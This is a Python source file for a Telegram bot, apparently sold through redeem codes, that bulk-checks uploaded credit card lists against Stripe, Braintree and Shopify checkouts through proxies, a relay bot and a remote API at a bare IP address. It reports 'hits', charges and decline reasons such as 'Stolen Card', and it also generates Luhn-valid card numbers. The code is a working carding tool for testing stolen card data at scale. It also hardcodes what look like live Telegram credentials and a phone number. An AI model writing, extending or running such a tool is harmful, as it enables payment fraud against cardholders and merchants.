#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║            STRIPE + BRAINTREE + SHOPIFY CHECKER – FULL & FIXED               ║
║                              by @Unknownentit7                                ║
║                                                                              ║
║   • Only owner‑uploaded Shopify sites (no hardcoded defaults)                ║
║   • Raw URL to Shopify API – fixed "Bad hostname"                            ║
║   • Proper JSON decline reason extraction                                    ║
║   • Shopify users can access BIN / Card Generator                            ║
║   • Shared HTTP session – ultra fast                                         ║
║   • All gateways fully functional – no placeholders                          ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import asyncio
import os
import re
import json
import uuid
import secrets
import logging
import aiohttp
import random
import time
from typing import Dict, Optional, Tuple, List, Set
from datetime import datetime, timedelta
from pathlib import Path

from telethon import TelegramClient, events
from telethon.tl.types import DocumentAttributeFilename
from telethon.tl.custom import Button
from telethon.errors import RPCError, SessionPasswordNeededError

# ======================== CONFIGURATION ========================
BOT_TOKEN = "8765865854:AAGh5g1ZIHfXEJVU2FAFyjhl2W1WQO9kuJg"
PAYU_BOT_USERNAME = "@newpayubot"
MAX_CARDS_PER_FILE_STRIPE = 10000
MAX_CARDS_PER_FILE_BRAINTREE = 3000
MAX_CARDS_PER_FILE_SHOPIFY = 3000
DELAY_BETWEEN_CHECKS = 0.5
BOT_OWNER_ID = 8205144423
ADMINS = [BOT_OWNER_ID]
NUM_WORKERS = 8

API_ID = 33424122
API_HASH = "b4c85089f9748bf3a33f7043c64af7c5"
PHONE_NUMBER = "+919320665632"

STORAGE_DIR = "uploads"
PROCESSED_DIR = "processed"
DATA_FILE = "users.json"
USER_STATS_FILE = "user_stats.json"
REDEEM_CODES_FILE = "redeem_codes.json"
SHOPIFY_REDEEM_CODES_FILE = "shopify_redeem_codes.json"
OWNER_SHOPIFY_SITES_FILE = "owner_shopify_sites.json"
FORWARD_CHAT_ID = BOT_OWNER_ID

BIN_API_URL = "https://lookup.binlist.net/{}"

SHOPIFY_API_URL = "http://108.165.12.183:8081/"
SHOPIFY_GATEWAY_TIMEOUT = 10
PROXY_VALIDATION_TIMEOUT = 6
SITE_CHECK_INTERVAL_HOURS = 2
PROXY_VALIDATION_CONCURRENCY = 40
# ===============================================================

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)

os.makedirs(STORAGE_DIR, exist_ok=True)
os.makedirs(PROCESSED_DIR, exist_ok=True)


class CardCheckerBot:
    def __init__(self):
        # ----- User & Access -----
        self.users: Dict[int, Optional[datetime]] = {}
        self.shopify_users: Dict[int, Optional[datetime]] = {}
        self.user_stats: Dict[int, dict] = {}
        self.redeem_codes: Dict[str, Optional[datetime]] = {}
        self.shopify_redeem_codes: Dict[str, Optional[datetime]] = {}

        # ----- Job Queue -----
        self.active_jobs: Dict[str, dict] = {}
        self.task_queue = asyncio.Queue()
        self.worker_tasks: List[asyncio.Task] = []

        # ----- Global Stats -----
        self.stats = {
            "total_checked": 0,
            "total_approved": 0,
            "started": datetime.now().isoformat()
        }

        # ----- Telethon Clients -----
        self.bot_client: Optional[TelegramClient] = None
        self.user_client: Optional[TelegramClient] = None

        # ----- Concurrency Helpers -----
        self._processing_cards: Set[str] = set()
        self._bin_cache: Dict[str, dict] = {}
        self.start_time = datetime.now()
        self.user_upload_mode: Dict[int, Optional[str]] = {}

        # ----- Shopify Specific -----
        self.owner_shopify_sites: List[str] = []        # raw from file
        self.live_owner_sites: List[str] = []           # validated
        self.dead_owner_sites: Set[str] = set()
        self.user_proxies: Dict[int, List[str]] = {}    # validated proxies per user
        self.site_check_task: Optional[asyncio.Task] = None
        self.proxy_validation_semaphore = asyncio.Semaphore(PROXY_VALIDATION_CONCURRENCY)

        # ----- Shared HTTP Session (aiohttp) -----
        self.http_session: Optional[aiohttp.ClientSession] = None

    # ------------------------------------------------------------------
    #   HTTP Session (Shared for speed)
    # ------------------------------------------------------------------
    async def get_http_session(self) -> aiohttp.ClientSession:
        if self.http_session is None or self.http_session.closed:
            connector = aiohttp.TCPConnector(
                limit=100,
                limit_per_host=30,
                ttl_dns_cache=300,
                force_close=False,
                enable_cleanup_closed=True
            )
            timeout = aiohttp.ClientTimeout(total=SHOPIFY_GATEWAY_TIMEOUT)
            self.http_session = aiohttp.ClientSession(connector=connector, timeout=timeout)
        return self.http_session

    async def close_http_session(self):
        if self.http_session and not self.http_session.closed:
            await self.http_session.close()

    # ------------------------------------------------------------------
    #   Helper: Uptime
    # ------------------------------------------------------------------
    def get_uptime(self) -> str:
        delta = datetime.now() - self.start_time
        days = delta.days
        hours = delta.seconds // 3600
        minutes = (delta.seconds % 3600) // 60
        if days > 0:
            return f"{days}d {hours}h"
        elif hours > 0:
            return f"{hours}h {minutes}m"
        else:
            return f"{minutes}m"

    # ------------------------------------------------------------------
    #   User Management (Global + Shopify separate)
    # ------------------------------------------------------------------
    def load_users(self):
        if Path(DATA_FILE).exists():
            with open(DATA_FILE, 'r') as f:
                data = json.load(f)
            for uid, exp in data.items():
                self.users[int(uid)] = datetime.fromisoformat(exp) if exp else None

        shopify_file = Path("shopify_users.json")
        if shopify_file.exists():
            with open(shopify_file, 'r') as f:
                data = json.load(f)
            for uid, exp in data.items():
                self.shopify_users[int(uid)] = datetime.fromisoformat(exp) if exp else None

    def save_users(self):
        with open(DATA_FILE, 'w') as f:
            json.dump({str(k): v.isoformat() if v else None for k, v in self.users.items()}, f)
        with open("shopify_users.json", 'w') as f:
            json.dump({str(k): v.isoformat() if v else None for k, v in self.shopify_users.items()}, f)

    def load_user_stats(self):
        if Path(USER_STATS_FILE).exists():
            with open(USER_STATS_FILE, 'r') as f:
                self.user_stats = {int(k): v for k, v in json.load(f).items()}

    def save_user_stats(self):
        with open(USER_STATS_FILE, 'w') as f:
            json.dump({str(k): v for k, v in self.user_stats.items()}, f)

    def update_user_stats(self, user_id: int, checked: int = 0, approved: int = 0):
        if user_id not in self.user_stats:
            self.user_stats[user_id] = {"total_checked": 0, "total_approved": 0}
        self.user_stats[user_id]["total_checked"] += checked
        self.user_stats[user_id]["total_approved"] += approved
        self.save_user_stats()

    def get_user_stats(self, user_id: int) -> dict:
        return self.user_stats.get(user_id, {"total_checked": 0, "total_approved": 0})

    def is_user_approved(self, user_id: int) -> bool:
        if user_id in ADMINS:
            return True
        exp = self.users.get(user_id)
        if exp is None:
            return True
        if exp and exp > datetime.now():
            return True
        # Expired
        if user_id in self.users:
            del self.users[user_id]
            self.save_users()
        return False

    def is_shopify_approved(self, user_id: int) -> bool:
        if user_id in ADMINS:
            return True
        exp = self.shopify_users.get(user_id)
        if exp is None:
            return True
        if exp and exp > datetime.now():
            return True
        if user_id in self.shopify_users:
            del self.shopify_users[user_id]
            self.save_users()
        return False

    def has_any_access(self, user_id: int) -> bool:
        return self.is_user_approved(user_id) or self.is_shopify_approved(user_id)

    async def approve_user(self, user_id: int, duration: str):
        dur = duration.lower().strip()
        if dur == "perm":
            expiry = None
        else:
            match = re.match(r"(\d+)([mhdw]|month)", dur)
            if not match:
                return False, "❌ Invalid duration. Use: 30m, 2h, 3d, 1w, 1month, perm"
            val = int(match.group(1))
            unit = match.group(2)
            now = datetime.now()
            if unit == 'm':
                expiry = now + timedelta(minutes=val)
            elif unit == 'h':
                expiry = now + timedelta(hours=val)
            elif unit == 'd':
                expiry = now + timedelta(days=val)
            elif unit == 'w':
                expiry = now + timedelta(weeks=val)
            elif unit == 'month':
                expiry = now + timedelta(days=val*30)
            else:
                return False, "❌ Unknown unit."
        self.users[user_id] = expiry
        self.save_users()
        expiry_str = "Permanent" if expiry is None else expiry.strftime("%Y-%m-%d %H:%M:%S UTC")
        try:
            await self.bot_client.send_message(
                user_id,
                f"✅ *Global Access Granted*\nExpires: `{expiry_str}`\nUse /start",
                parse_mode='markdown'
            )
        except:
            pass
        return True, f"✅ User `{user_id}` approved until `{expiry_str}`."

    async def approve_shopify_user(self, user_id: int, duration: str):
        dur = duration.lower().strip()
        if dur == "perm":
            exp = None
        else:
            match = re.match(r"(\d+)([mhdw]|month)", dur)
            if not match:
                return False, "Invalid duration"
            val = int(match.group(1))
            unit = match.group(2)
            now = datetime.now()
            if unit == 'm':
                exp = now + timedelta(minutes=val)
            elif unit == 'h':
                exp = now + timedelta(hours=val)
            elif unit == 'd':
                exp = now + timedelta(days=val)
            elif unit == 'w':
                exp = now + timedelta(weeks=val)
            elif unit == 'month':
                exp = now + timedelta(days=val*30)
            else:
                return False, "Unknown unit"
        self.shopify_users[user_id] = exp
        self.save_users()
        exp_str = "Permanent" if exp is None else exp.strftime("%Y-%m-%d %H:%M:%S UTC")
        try:
            await self.bot_client.send_message(
                user_id,
                f"✅ *Shopify Access Granted*\nExpires: `{exp_str}`",
                parse_mode='markdown'
            )
        except:
            pass
        return True, f"Shopify access for {user_id} until {exp_str}"

    async def revoke_user(self, user_id: int):
        if user_id in self.users:
            del self.users[user_id]
            self.save_users()
            for job_id, job in list(self.active_jobs.items()):
                if job['user_id'] == user_id:
                    job['stop'] = True
            try:
                await self.bot_client.send_message(user_id, "❌ *Global Access Revoked*", parse_mode='markdown')
            except:
                pass
            return True, f"❌ User `{user_id}` revoked."
        return False, f"User `{user_id}` not found."

    async def revoke_shopify_user(self, user_id: int):
        if user_id in self.shopify_users:
            del self.shopify_users[user_id]
            self.save_users()
            try:
                await self.bot_client.send_message(user_id, "❌ *Shopify Access Revoked*", parse_mode='markdown')
            except:
                pass
            return True, f"❌ Shopify access for `{user_id}` revoked."
        return False, f"User `{user_id}` not found in Shopify list."

    async def revoke_all_non_admins(self):
        admin_ids = set(ADMINS)
        to_remove = [uid for uid in self.users.keys() if uid not in admin_ids]
        for uid in to_remove:
            await self.revoke_user(uid)
        return len(to_remove)

    # ------------------------------------------------------------------
    #   Redeem Codes (Global + Shopify)
    # ------------------------------------------------------------------
    def load_redeem_codes(self):
        if Path(REDEEM_CODES_FILE).exists():
            with open(REDEEM_CODES_FILE, 'r') as f:
                data = json.load(f)
                for code, exp in data.items():
                    self.redeem_codes[code] = datetime.fromisoformat(exp) if exp else None
        if Path(SHOPIFY_REDEEM_CODES_FILE).exists():
            with open(SHOPIFY_REDEEM_CODES_FILE, 'r') as f:
                data = json.load(f)
                for code, exp in data.items():
                    self.shopify_redeem_codes[code] = datetime.fromisoformat(exp) if exp else None

    def save_redeem_codes(self):
        with open(REDEEM_CODES_FILE, 'w') as f:
            json.dump({c: e.isoformat() if e else None for c, e in self.redeem_codes.items()}, f)
        with open(SHOPIFY_REDEEM_CODES_FILE, 'w') as f:
            json.dump({c: e.isoformat() if e else None for c, e in self.shopify_redeem_codes.items()}, f)

    def generate_redeem_code(self, duration: str) -> str:
        code = secrets.token_hex(6).upper()
        dur = duration.lower().strip()
        if dur == "perm":
            expiry = None
        else:
            match = re.match(r"(\d+)([mhdw]|month)", dur)
            if not match:
                return None
            val = int(match.group(1))
            unit = match.group(2)
            now = datetime.now()
            if unit == 'm':
                expiry = now + timedelta(minutes=val)
            elif unit == 'h':
                expiry = now + timedelta(hours=val)
            elif unit == 'd':
                expiry = now + timedelta(days=val)
            elif unit == 'w':
                expiry = now + timedelta(weeks=val)
            elif unit == 'month':
                expiry = now + timedelta(days=val*30)
            else:
                return None
        self.redeem_codes[code] = expiry
        self.save_redeem_codes()
        return code

    def generate_shopify_redeem_code(self, duration: str) -> str:
        code = "SP" + secrets.token_hex(6).upper()
        dur = duration.lower().strip()
        if dur == "perm":
            exp = None
        else:
            match = re.match(r"(\d+)([mhdw]|month)", dur)
            if not match:
                return None
            val = int(match.group(1))
            unit = match.group(2)
            now = datetime.now()
            if unit == 'm':
                exp = now + timedelta(minutes=val)
            elif unit == 'h':
                exp = now + timedelta(hours=val)
            elif unit == 'd':
                exp = now + timedelta(days=val)
            elif unit == 'w':
                exp = now + timedelta(weeks=val)
            elif unit == 'month':
                exp = now + timedelta(days=val*30)
            else:
                return None
        self.shopify_redeem_codes[code] = exp
        self.save_redeem_codes()
        return code

    async def redeem_code(self, user_id: int, code: str) -> Tuple[bool, str]:
        code = code.strip().upper()
        if code in self.redeem_codes:
            exp = self.redeem_codes.pop(code)
            self.save_redeem_codes()
            self.users[user_id] = exp
            self.save_users()
            exp_str = "Permanent" if exp is None else exp.strftime("%Y-%m-%d %H:%M:%S UTC")
            await self.bot_client.send_message(user_id, f"✅ Global access granted until `{exp_str}`", parse_mode='markdown')
            return True, "global"
        if code in self.shopify_redeem_codes:
            exp = self.shopify_redeem_codes.pop(code)
            self.save_redeem_codes()
            self.shopify_users[user_id] = exp
            self.save_users()
            exp_str = "Permanent" if exp is None else exp.strftime("%Y-%m-%d %H:%M:%S UTC")
            await self.bot_client.send_message(user_id, f"✅ Shopify access granted until `{exp_str}`", parse_mode='markdown')
            return True, "shopify"
        return False, ""

    # ------------------------------------------------------------------
    #   Owner Shopify Site Management (No defaults)
    # ------------------------------------------------------------------
    def load_owner_sites(self):
        if Path(OWNER_SHOPIFY_SITES_FILE).exists():
            with open(OWNER_SHOPIFY_SITES_FILE, 'r') as f:
                data = json.load(f)
                self.owner_shopify_sites = data.get("sites", [])

    def save_owner_sites(self):
        with open(OWNER_SHOPIFY_SITES_FILE, 'w') as f:
            json.dump({"sites": self.owner_shopify_sites}, f)

    async def validate_site(self, url: str) -> bool:
        try:
            session = await self.get_http_session()
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                return resp.status == 200
        except:
            return False

    async def update_site_health(self):
        """Periodically validate owner sites."""
        while True:
            if not self.owner_shopify_sites:
                logger.warning("No owner sites uploaded yet.")
                await asyncio.sleep(SITE_CHECK_INTERVAL_HOURS * 3600)
                continue
            logger.info("Running Shopify site health check...")
            live = []
            dead = set()
            for site in self.owner_shopify_sites:
                if await self.validate_site(site):
                    live.append(site)
                else:
                    dead.add(site)
            self.live_owner_sites = live
            self.dead_owner_sites = dead
            logger.info(f"Live owner sites: {len(live)}")
            await asyncio.sleep(SITE_CHECK_INTERVAL_HOURS * 3600)

    def get_active_sites(self) -> List[str]:
        """Return only live owner sites."""
        return self.live_owner_sites.copy()

    # ------------------------------------------------------------------
    #   Proxy Validation
    # ------------------------------------------------------------------
    def parse_proxy(self, proxy_str: str) -> Optional[Tuple[str, str, str, str]]:
        parts = proxy_str.split(':')
        if len(parts) != 4:
            return None
        return parts[0], parts[1], parts[2], parts[3]

    async def validate_proxy(self, proxy_str: str) -> bool:
        async with self.proxy_validation_semaphore:
            try:
                parsed = self.parse_proxy(proxy_str)
                if not parsed:
                    return False
                host, port, user, pwd = parsed
                proxy_url = f"http://{user}:{pwd}@{host}:{port}"
                session = await self.get_http_session()
                async with session.get(
                    SHOPIFY_API_URL,
                    proxy=proxy_url,
                    timeout=aiohttp.ClientTimeout(total=PROXY_VALIDATION_TIMEOUT),
                    params={"test": "1"}
                ) as resp:
                    return resp.status == 200
            except:
                return False

    async def validate_proxies_batch(self, proxies: List[str]) -> List[str]:
        tasks = [self.validate_proxy(p) for p in proxies]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        return [p for p, res in zip(proxies, results) if res is True]

    # ------------------------------------------------------------------
    #   Shopify Gateway Call (raw URL, no encoding)
    # ------------------------------------------------------------------
    async def check_shopify_gateway(self, card_line: str, url: str, proxy_str: str) -> Tuple[str, bool, dict]:
        try:
            parsed = self.parse_proxy(proxy_str)
            if not parsed:
                return "Invalid proxy format", False, {"reason": "Invalid proxy"}
            host, port, user, pwd = parsed
            proxy_url = f"http://{user}:{pwd}@{host}:{port}"
            params = {"cc": card_line, "url": url, "proxy": proxy_str}
            session = await self.get_http_session()
            async with session.get(
                SHOPIFY_API_URL,
                params=params,
                proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=SHOPIFY_GATEWAY_TIMEOUT)
            ) as resp:
                text = await resp.text()
                info = self.parse_shopify_response(text)
                approved = info.get("approved", False)
                return text, approved, info
        except asyncio.TimeoutError:
            return "Gateway timeout", False, {"reason": "Timeout"}
        except Exception as e:
            return f"Error: {str(e)}", False, {"reason": "Error", "details": str(e)}

    def parse_shopify_response(self, raw: str) -> dict:
        info = {"raw_short": raw[:200]}
        try:
            data = json.loads(raw)
            resp_text = data.get("Response", "")
            gate = data.get("Gate", "Unknown")
            price = data.get("Price", "0.00")
            info["gate"] = gate
            info["price"] = price
            low = resp_text.lower()
            if "approved" in low or "success" in low:
                info["approved"] = True
                info["reason"] = "Approved"
                if price != "0.00":
                    info["amount"] = price
            elif "insufficient" in low:
                info["approved"] = False
                info["reason"] = "Insufficient Funds"
            elif "processing error" in low:
                info["approved"] = False
                info["reason"] = "Processing Error"
            elif "captcha" in low or "challenge" in low:
                info["approved"] = False
                info["reason"] = "Captcha Required"
            elif "declined" in low:
                info["approved"] = False
                info["reason"] = "Declined"
            elif "do not honor" in low:
                info["approved"] = False
                info["reason"] = "Do Not Honor"
            elif "stolen" in low:
                info["approved"] = False
                info["reason"] = "Stolen Card"
            elif "pickup" in low:
                info["approved"] = False
                info["reason"] = "Pickup Card"
            elif "lost" in low:
                info["approved"] = False
                info["reason"] = "Lost Card"
            elif "invalid" in low:
                info["approved"] = False
                info["reason"] = "Invalid Card"
            elif "bad hostname" in low:
                info["approved"] = False
                info["reason"] = "Bad Hostname (Site Error)"
            else:
                info["approved"] = False
                info["reason"] = resp_text[:50] if resp_text else "Unknown"
            return info
        except json.JSONDecodeError:
            low = raw.lower()
            info["approved"] = "approved" in low and "declined" not in low
            if "insufficient" in low:
                info["reason"] = "Insufficient Funds"
            elif "processing error" in low:
                info["reason"] = "Processing Error"
            elif "captcha" in low:
                info["reason"] = "Captcha Required"
            elif "declined" in low:
                info["reason"] = "Declined"
            else:
                info["reason"] = raw[:50]
            return info

    # ------------------------------------------------------------------
    #   BIN Lookup (cached)
    # ------------------------------------------------------------------
    async def get_bin_info(self, bin_number: str) -> Optional[dict]:
        bin_number = bin_number[:6]
        if bin_number in self._bin_cache:
            return self._bin_cache[bin_number]
        url = BIN_API_URL.format(bin_number)
        try:
            session = await self.get_http_session()
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=3)) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    self._bin_cache[bin_number] = data
                    return data
        except:
            pass
        return None

    # ------------------------------------------------------------------
    #   Card Generator
    # ------------------------------------------------------------------
    def luhn_checksum(self, card_number: str) -> int:
        def digits_of(n):
            return [int(d) for d in str(n)]
        digits = digits_of(card_number)
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        checksum = sum(odd_digits)
        for d in even_digits:
            checksum += sum(digits_of(d * 2))
        return checksum % 10

    def generate_card_number(self, bin_prefix: str) -> str:
        length = 16
        while len(bin_prefix) < length:
            bin_prefix += str(random.randint(0, 9))
        check_digit = (10 - self.luhn_checksum(bin_prefix[:15])) % 10
        return bin_prefix[:15] + str(check_digit)

    def generate_cards(self, count: int, bin_input: Optional[str] = None) -> List[str]:
        cards = []
        for _ in range(count):
            if bin_input and bin_input.isdigit() and len(bin_input) >= 6:
                bin_prefix = bin_input[:6]
            else:
                bin_prefix = random.choice(["424242", "400005", "555555", "411111", "378282"])
            card_num = self.generate_card_number(bin_prefix)
            now = datetime.now()
            future_year = now.year + random.randint(1, 4)
            month = random.randint(1, 12)
            mm = f"{month:02d}"
            yy = str(future_year)[-2:]
            cvv = f"{random.randint(100, 999):03d}"
            cards.append(f"{card_num}|{mm}|{yy}|{cvv}")
        return cards

    # ------------------------------------------------------------------
    #   File Helpers
    # ------------------------------------------------------------------
    def save_cards_file(self, content: bytes, user_id: int, chat_id: int) -> str:
        filename = f"{user_id}_{chat_id}_{uuid.uuid4().hex}.txt"
        filepath = os.path.join(STORAGE_DIR, filename)
        with open(filepath, "wb") as f:
            f.write(content)
        return filepath

    def validate_cards_file(self, filepath: str, max_cards: int) -> Tuple[bool, int, Optional[str]]:
        try:
            with open(filepath, "r", encoding="utf-8") as f:
                lines = [l.strip() for l in f if l.strip()]
        except Exception as e:
            return False, 0, f"Error reading file: {e}"
        if len(lines) > max_cards:
            return False, len(lines), f"File has {len(lines)} cards. Max {max_cards}."
        pattern = re.compile(r"^\d{13,19}\|\d{2}\|\d{2,4}\|\d{3,4}$")
        invalid = [l for l in lines if not pattern.match(l)]
        if invalid:
            return False, len(lines), f"Invalid format: {invalid[:3]}"
        return True, len(lines), None

    # ------------------------------------------------------------------
    #   Response Formatters
    # ------------------------------------------------------------------
    async def format_stripe_approved(self, card_line: str, raw: str, include_charge: bool = False) -> str:
        parts = card_line.split('|')
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        masked = f"{cc[:4]}****{cc[-4:]}" if len(cc) >= 8 else cc
        bin_info = await self.get_bin_info(cc)
        bin_line = ""
        if bin_info:
            brand = bin_info.get('brand', 'Unknown')
            issuer = bin_info.get('issuer', 'Unknown')
            country = bin_info.get('country', {}).get('name', 'Unknown')
            card_type = bin_info.get('type', 'Unknown')
            bin_line = f"🔍 BIN: `{cc[:6]}` | {brand} | {issuer} | {country} | {card_type}\n"
        gateway = "Stripe"
        bank = "Unknown"
        ctype = "Unknown"
        for line in raw.split('\n'):
            line = line.strip()
            if "Gateway:" in line:
                gateway = line.split("Gateway:")[-1].strip()
            elif "Bank:" in line:
                bank = line.split("Bank:")[-1].strip()
            elif "Type:" in line:
                ctype = line.split("Type:")[-1].strip()
        short = (raw[:80] + '...') if len(raw) > 80 else raw
        msg = (
            f"✨✨✨ *SUCCESS* ✨✨✨\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"💳 `{masked}`\n"
            f"📅 `{mm}/{yy}`  |  🔐 `{cvv}`\n"
            f"{bin_line}"
            f"🌐 `{gateway}`\n"
            f"🏦 `{bank}`\n"
            f"🏷️ `{ctype}`"
        )
        if include_charge:
            charge = self.extract_charge(raw)
            if charge is not None:
                msg += f"\n💰 `${charge:.2f}`"
            else:
                msg += f"\n💰 `N/A`"
        msg += f"\n━━━━━━━━━━━━━━━━━━━━\n_`{short}`_"
        return msg

    async def format_braintree_auth(self, card_line: str, raw: str) -> str:
        parts = card_line.split('|')
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        masked = f"{cc[:4]}****{cc[-4:]}" if len(cc) >= 8 else cc
        bin_info = await self.get_bin_info(cc)
        bin_line = ""
        if bin_info:
            brand = bin_info.get('brand', 'Unknown')
            issuer = bin_info.get('issuer', 'Unknown')
            country = bin_info.get('country', {}).get('name', 'Unknown')
            card_type = bin_info.get('type', 'Unknown')
            bin_line = f"🔍 BIN: `{cc[:6]}` | {brand} | {issuer} | {country} | {card_type}\n"
        gateway = "Braintree (Auth)"
        bank = "Unknown"
        ctype = "Unknown"
        for line in raw.split('\n'):
            line = line.strip()
            if "Gateway:" in line:
                gateway = line.split("Gateway:")[-1].strip()
            elif "Bank:" in line:
                bank = line.split("Bank:")[-1].strip()
            elif "Type:" in line:
                ctype = line.split("Type:")[-1].strip()
        short = (raw[:80] + '...') if len(raw) > 80 else raw
        msg = (
            f"✨✨✨ *SUCCESS* ✨✨✨\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"💳 `{masked}`\n"
            f"📅 `{mm}/{yy}`  |  🔐 `{cvv}`\n"
            f"{bin_line}"
            f"🌐 `{gateway}`\n"
            f"🏦 `{bank}`\n"
            f"🏷️ `{ctype}`\n"
            f"━━━━━━━━━━━━━━━━━━━━\n_`{short}`_"
        )
        return msg

    async def format_braintree_charged(self, card_line: str, raw: str) -> str:
        parts = card_line.split('|')
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        masked = f"{cc[:4]}****{cc[-4:]}" if len(cc) >= 8 else cc
        bin_info = await self.get_bin_info(cc)
        bin_line = ""
        if bin_info:
            brand = bin_info.get('brand', 'Unknown')
            issuer = bin_info.get('issuer', 'Unknown')
            country = bin_info.get('country', {}).get('name', 'Unknown')
            card_type = bin_info.get('type', 'Unknown')
            bin_line = f"🔍 BIN: `{cc[:6]}` | {brand} | {issuer} | {country} | {card_type}\n"
        gateway = "Braintree (Charge $1.0)"
        bank = "Unknown"
        ctype = "Unknown"
        for line in raw.split('\n'):
            line = line.strip()
            if "Gateway:" in line:
                gateway = line.split("Gateway:")[-1].strip()
            elif "Bank:" in line:
                bank = line.split("Bank:")[-1].strip()
            elif "Type:" in line:
                ctype = line.split("Type:")[-1].strip()
        short = (raw[:80] + '...') if len(raw) > 80 else raw
        msg = (
            f"💰💰💰 *CHARGE SUCCESS* 💰💰💰\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"💳 `{masked}`\n"
            f"📅 `{mm}/{yy}`  |  🔐 `{cvv}`\n"
            f"{bin_line}"
            f"🌐 `{gateway}`\n"
            f"🏦 `{bank}`\n"
            f"🏷️ `{ctype}`\n"
            f"💵 *Amount: $1.00*\n"
            f"━━━━━━━━━━━━━━━━━━━━\n_`{short}`_"
        )
        return msg

    async def format_shopify_result(self, card_line: str, url: str, raw: str, approved: bool, info: dict) -> str:
        parts = card_line.split('|')
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        masked = f"{cc[:4]}****{cc[-4:]}"
        bin_info = await self.get_bin_info(cc)
        bin_text = ""
        if bin_info:
            brand = bin_info.get('brand', '?')
            country = bin_info.get('country', {}).get('name', '?')
            bank = bin_info.get('bank', {}).get('name', '?')
            bin_text = f"🏦 BIN: `{cc[:6]}` | {brand} | {country}\n{bank}\n"
        if approved:
            header = "🛒 *SHOPIFY CHARGE SUCCESS*"
            amount = info.get("amount", info.get("price", "?"))
            status = f"💰 Charged: `${amount}`"
        else:
            reason = info.get("reason", "Declined")
            header = f"❌ *SHOPIFY DECLINED – {reason.upper()}*"
            status = f"🚫 Reason: `{reason}`"
        return (
            f"{header}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"💳 `{masked}`  |  `{mm}/{yy}`  |  🔐 `{cvv}`\n"
            f"{bin_text}"
            f"🌐 Site: `{url}`\n"
            f"{status}\n"
            f"📦 Response: `{info.get('raw_short', raw[:100])}`\n"
            f"━━━━━━━━━━━━━━━━━━━━"
        )

    def extract_charge(self, raw: str) -> Optional[float]:
        match = re.search(r'\$(\d+\.\d{2})', raw)
        if match:
            return float(match.group(1))
        return None

    def progress_bar(self, cur: int, tot: int, width: int = 22) -> str:
        if tot == 0:
            percent = 0
        else:
            percent = cur / tot
        filled = int(width * percent)
        bar = '█' * filled + '▒' * (width - filled)
        return f"`{bar}` {cur}/{tot} ({percent:.1%})"

    # ------------------------------------------------------------------
    #   PayU Gateway (Stripe/Braintree)
    # ------------------------------------------------------------------
    async def send_card_to_payu(self, card_line: str) -> str:
        cmd = f"/st {card_line}"
        await self.user_client.send_message(PAYU_BOT_USERNAME, cmd)
        start = datetime.now()
        bin_prefix = card_line.split('|')[0]
        while (datetime.now() - start).total_seconds() < 5.0:
            await asyncio.sleep(0.3)
            async for msg in self.user_client.iter_messages(PAYU_BOT_USERNAME, limit=10):
                if not msg.out and bin_prefix in msg.text:
                    lower = msg.text.lower()
                    if "processing" in lower:
                        continue
                    return msg.text
        return "No response received"

    def is_approved(self, resp: str) -> bool:
        if not resp:
            return False
        low = resp.lower()
        return "approved" in low and "processing" not in low and "declined" not in low

    # ------------------------------------------------------------------
    #   UI Helpers
    # ------------------------------------------------------------------
    async def show_user_dashboard(self, user_id: int, chat_id: int):
        exp_global = self.users.get(user_id)
        global_str = "Permanent" if exp_global is None else exp_global.strftime("%Y-%m-%d %H:%M UTC") if exp_global else "No Access"
        exp_shop = self.shopify_users.get(user_id)
        shop_str = "Permanent" if exp_shop is None else exp_shop.strftime("%Y-%m-%d %H:%M UTC") if exp_shop else "No Access"
        stats = self.get_user_stats(user_id)
        checked = stats.get("total_checked", 0)
        approved = stats.get("total_approved", 0)
        rate = (approved / checked * 100) if checked else 0.0
        dash = (
            "👤 *Your Account*\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ *Global:* `{global_str}`\n"
            f"🛒 *Shopify:* `{shop_str}`\n"
            f"📊 Checked: `{checked}`\n"
            f"🔥 Hits: `{approved}`\n"
            f"💯 Rate: `{rate:.1f}%`\n"
            "━━━━━━━━━━━━━━━━━━━━"
        )
        await self.bot_client.send_message(chat_id, dash, parse_mode='markdown')

    async def bin_search(self, chat_id: int, bin_number: str):
        info = await self.get_bin_info(bin_number)
        if info:
            brand = info.get('brand', 'Unknown')
            issuer = info.get('issuer', 'Unknown')
            country = info.get('country', {}).get('name', 'Unknown')
            card_type = info.get('type', 'Unknown')
            scheme = info.get('scheme', 'Unknown')
            result = (
                f"🔍 *BIN Lookup Result*\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"*BIN:* `{bin_number}`\n"
                f"*Brand:* `{brand}`\n"
                f"*Issuer:* `{issuer}`\n"
                f"*Country:* `{country}`\n"
                f"*Type:* `{card_type}`\n"
                f"*Scheme:* `{scheme}`"
            )
        else:
            result = f"❌ Could not retrieve info for BIN `{bin_number}`."
        await self.bot_client.send_message(chat_id, result, parse_mode='markdown')

    async def animated_startup(self, event):
        frames = ["⚡ System Booting...", "🔌 Connecting to gateway...", "✅ Ready."]
        msg = await event.reply(frames[0])
        for f in frames[1:]:
            await asyncio.sleep(0.8)
            await msg.edit(f)
        await asyncio.sleep(0.5)
        await msg.delete()

    async def glowing_success(self, msg, final_text):
        glow_frames = [
            "✨✨✨ *SUCCESS* ✨✨✨",
            "🔥🔥🔥 *SUCCESS* 🔥🔥🔥",
            "✨✨✨ *SUCCESS* ✨✨✨"
        ]
        for frame in glow_frames:
            await msg.edit(frame, parse_mode='markdown')
            await asyncio.sleep(0.2)
        await msg.edit(final_text, parse_mode='markdown')

